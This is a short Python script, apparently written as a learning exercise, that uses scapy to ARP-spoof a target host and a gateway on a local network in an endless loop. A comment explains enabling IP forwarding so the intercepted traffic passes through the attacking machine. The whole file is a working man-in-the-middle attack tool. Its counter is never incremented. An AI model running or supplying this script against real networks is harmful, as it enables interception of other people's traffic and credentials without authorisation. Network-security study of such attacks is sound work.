#!/usr/bin/env python
import time
import scapy.all as scapy

# created by Wambugu
# 30-08-2022


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # get IPs of clients from arp broadcast request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # send arp request to the broadcast address
    arp_request_broadcast = broadcast / arp_request
    # capture answered result packets in a list, set a time to end search and less verbose result
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


sent_packets_count = 0
while True:
    spoof("192.168.100.10", "192.168.100.1")
    spoof("192.168.100.1", "192.168.100.10")
    print("[+] Packets sent: " + str(sent_packets_count))
    time.sleep(2)

    # echo 1 > /proc/sys/net/ipv4/ip_forward
    # above command allows packets to flow through attacking machine without being dropped
